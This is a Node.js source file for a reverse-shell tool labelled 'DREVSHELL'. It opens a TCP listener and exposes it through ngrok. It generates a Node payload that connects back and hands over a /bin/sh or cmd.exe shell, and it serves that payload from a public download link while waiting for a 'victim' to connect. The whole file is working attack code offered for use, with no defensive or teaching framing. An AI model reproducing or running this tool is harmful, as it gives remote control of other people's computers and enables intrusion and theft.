#!/usr/bin/env node
require("dotenv").config({ quiet: true });
let net = require("net"),
  fs = require("fs"),
  ngrok = require("@ngrok/ngrok"),
  express = require("express"),
  path = require("path");

let portNgrok;
let hostNgrok;
let urlDownload;

const G = `\x1b[32m`;
const r = `\x1b[0m`;

const ascii = `
DDDD  RRRR  EEEEE V   V  SSSS H   H EEEEE L     L     
D   D R   R E     V   V S     H   H E     L     L     
D   D RRRR  EEEE  V   V  SSS  HHHHH EEEE  L     L     
D   D R  R  E      V V      S H   H E     L     L     
DDDD  R   R EEEEE   V   SSSS  H   H EEEEE LLLLL LLLLL 
                                                      `

function Netcat(port) {
  return new Promise((resolve) => {
    const netcat = net.createServer((socket) => {
      console.log(`\n[${G}+${r}] ${G}Victim Connected${r}`)
      process.stdin.pipe(socket);
      socket.pipe(process.stdout);

      socket.on("close", () => {
        console.log("Connection Close");
      });
    });
    netcat.listen(port, process.env.IP_ADDRESS, () => {
      ngrok
        .forward({
          addr: port,
          proto: "tcp",
          authtoken: process.env.NGROK_AUTHTOKEN,
        })
        .then((res) => {
          portNgrok = res.url().split("tcp://")[1].split(":")[1];
          hostNgrok = res.url().split("tcp://")[1].split(":")[0];
          resolve(true);
        })
        .catch((error) => {
          console.log(error);
          resolve(false);
        });
    });
  });
}

async function Payload(port) {
  return new Promise(async (resolve) => {
    const listener = await Netcat(port);
    if (listener) {
      try {
        const payload = `const net = require("net");\nconst {spawn} = require("child_process");\nconst victim = new net.Socket()\nvictim.connect(${portNgrok}, "${hostNgrok}", () => {\nconst shell = process.platform === "win32" ? "cmd.exe" : "/bin/sh";\nconst sh = spawn(shell, []);\nvictim.pipe(sh.stdin);\nsh.stdout.pipe(victim);\nsh.stderr.pipe(victim)\n});`;
        fs.writeFileSync("payload", payload);
        resolve(true);
      } catch (e) {
        console.log(e);
        resolve(false);
      }
    }
  });
}

function pageDownloadPayload(port) {
  return new Promise((resolve) => {
    const app = express();
    const payload = path.join(__dirname, "payload");

    app.get("/payload", (req, res) => {
      res.download(payload, (err) => {
        if (err) res.status(500).send("Error Download");
      });
    });
    const server = app.listen(port, () => {
      ngrok
        .forward({
          addr: port,
          proto: "http",
          authtoken: process.env.NGROK_AUTHTOKEN,
        })
        .then((res) => {
          urlDownload = res.url();
          resolve(res.url());
        })
        .catch((error) => {
          console.log(error);
        });
    });
  });
}

async function main(portTCP, portHTTP) {
  const listener_payload = await Payload(portTCP);
  if (listener_payload) {
    console.log(ascii)
    console.log(`[${G}*${r}] Listener Actived and Success Create Payload`);
    console.log(`[${G}+${r}] HOST: ${hostNgrok}, PORT: ${portNgrok}`)
    const urlPayload = await pageDownloadPayload(portHTTP);
    console.log(`[${G}+${r}] Link Download: ${G}${urlPayload}/payload${r}`)
    process.stdout.write(`[*] Please wait connection victim...`)
  }
}
main(process.env.PORT_TCP, process.env.PORT_HTTP);
